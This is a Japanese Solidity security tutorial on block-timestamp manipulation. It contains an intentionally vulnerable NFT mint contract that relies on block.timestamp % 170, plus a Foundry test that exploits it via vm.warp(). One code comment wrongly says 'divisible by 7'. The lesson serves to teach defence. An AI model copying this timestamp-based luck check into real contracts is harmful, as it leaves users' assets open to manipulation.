---
title: S14. ブロック時間の操作
tags:
- solidity
- security
- timestamp
---

# WTF Solidity 合約セキュリティ: S14. ブロック時間の操作

最近、Solidityを再学習し、詳細を固めるために「WTF Solidity 合約セキュリティ」を書いています。初心者向けのチュートリアル（プログラミング上級者は他のチュートリアルを参照してください）で、毎週1-3レッスンを更新します。

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science)｜[@WTFAcademy_](https://twitter.com/WTFAcademy_)

コミュニティ: [Discord](https://discord.gg/5akcruXrsk)｜[微信群](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[公式サイト wtf.academy](https://wtf.academy)

すべてのコードとチュートリアルはgithubで公開: [github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

---

このレッスンでは、スマートコントラクトのブロック時間操作攻撃について紹介し、Foundryを使って再現します。マージ（The Merge）以前、イーサリアムマイナーはブロック時間を操作することができ、抽選コントラクトの疑似乱数がブロック時間に依存している場合、攻撃される可能性がありました。

## ブロック時間

ブロック時間（block timestamp）は、イーサリアムブロックヘッダーに含まれる`uint64`値で、このブロックが作成されたUTCタイムスタンプ（単位：秒）を表します。マージ（The Merge）以前、イーサリアムは算力によってブロック難易度を調整するため、ブロック生成時間は不定で、平均14.5秒で1ブロックを生成し、マイナーがブロック時間を操作できました。マージ後は、固定で12秒に1ブロックに変更され、バリデーターノードはブロック時間を操作できません。

Solidityでは、開発者はグローバル変数`block.timestamp`を通じて現在のブロックのタイムスタンプを取得でき、型は`uint256`です。

## 脆弱性の例

この例は[WTF Solidity合約セキュリティ: S07. 悪い乱数](https://github.com/AmazingAng/WTF-Solidity/tree/main/S07_BadRandomness)のコントラクトを改写したものです。`mint()`鋳造関数の条件を変更しました：ブロック時間が170で割り切れる時のみ鋳造成功できます：

```solidity
contract TimeManipulation is ERC721 {
    uint256 totalSupply;

    // コンストラクタ、NFTコレクションの名前、シンボルを初期化
    constructor() ERC721("", ""){}

    // 鋳造関数：ブロック時間が7で割り切れる時のみmint成功
    function luckyMint() external returns(bool success){
        if(block.timestamp % 170 == 0){
            _mint(msg.sender, totalSupply); // mint
            totalSupply++;
            success = true;
        }else{
            success = false;
        }
    }
}
```

## Foundryでの攻撃再現

攻撃者はブロック時間を操作し、170で割り切れる数字に設定するだけで、NFTの鋳造に成功できます。この攻撃の再現にはFoundryを選択します。ブロック時間を修正するチートコード（cheatcodes）を提供するためです。Foundry/チートコードについて理解していない場合は、[Foundryチュートリアル](https://github.com/AmazingAng/WTF-Solidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md)と[Foundry Book](https://book.getfoundry.sh/forge/cheatcodes)をお読みください。

コードの大まかなロジック

1. `TimeManipulation`コントラクト変数`nft`を作成します。
2. ウォレットアドレス`alice`を作成します。
3. チートコード`vm.warp()`を使ってブロック時間を169に変更します。170で割り切れないため、鋳造は失敗します。
4. チートコード`vm.warp()`を使ってブロック時間を17000に変更します。170で割り切れるため、鋳造は成功します。

コード：

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.21;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/TimeManipulation.sol";

contract TimeManipulationTest is Test {
    TimeManipulation public nft;

    // 指定された秘密鍵のアドレスを計算
    address alice = vm.addr(1);

    function setUp() public {
        nft = new TimeManipulation();
    }

    // forge test -vv --match-test  testMint
    function testMint() public {
        console.log("条件 1: block.timestamp % 170 != 0");
        // block.timestampを169に設定
        vm.warp(169);
        console.log("block.timestamp: %s", block.timestamp);
        // 以降のすべての呼び出しのmsg.senderを入力アドレスに設定
        // `stopPrank`が呼ばれるまで
        vm.startPrank(alice);
        console.log("alice balance before mint: %s", nft.balanceOf(alice));
        nft.luckyMint();
        console.log("alice balance after mint: %s", nft.balanceOf(alice));

        // block.timestampを17000に設定
        console.log("条件 2: block.timestamp % 170 == 0");
        vm.warp(17000);
        console.log("block.timestamp: %s", block.timestamp);
        console.log("alice balance before mint: %s", nft.balanceOf(alice));
        nft.luckyMint();
        console.log("alice balance after mint: %s", nft.balanceOf(alice));
        vm.stopPrank();
    }
}

```

Foundryをインストール後、コマンドラインで以下のコマンドを入力して新プロジェクトを開始し、openzeppelinライブラリをインストールします：

```shell
forge init TimeManipulation
cd TimeManipulation
forge install Openzeppelin/openzeppelin-contracts
```

このレッスンのコードをそれぞれ`src`と`test`ディレクトリにコピーし、以下のコマンドでテストケースを実行します：

```shell
forge test -vv --match-test testMint
```

出力は以下の通りです：

```shell
Running 1 test for test/TimeManipulation.t.sol:TimeManipulationTest
[PASS] testMint() (gas: 94666)
Logs:
  条件 1: block.timestamp % 170 != 0
  block.timestamp: 169
  alice balance before mint: 0
  alice balance after mint: 0
  条件 2: block.timestamp % 170 == 0
  block.timestamp: 17000
  alice balance before mint: 0
  alice balance after mint: 1

Test result: ok. 1 passed; 0 failed; finished in 7.64ms
```

`block.timestamp`を17000に変更した時、鋳造が成功したことが確認できます。

## まとめ

このレッスンでは、スマートコントラクトのブロック時間操作攻撃について紹介し、Foundryを使って再現しました。マージ（The Merge）以前、イーサリアムマイナーはブロック時間を操作でき、抽選コントラクトの疑似乱数がブロック時間に依存している場合、攻撃される可能性がありました。マージ後、イーサリアムは固定で12秒に1ブロックに変更され、バリデーターノードはブロック時間を操作できません。したがって、この種の攻撃はイーサリアム上では発生しませんが、他のパブリックチェーンでは依然として遭遇する可能性があります。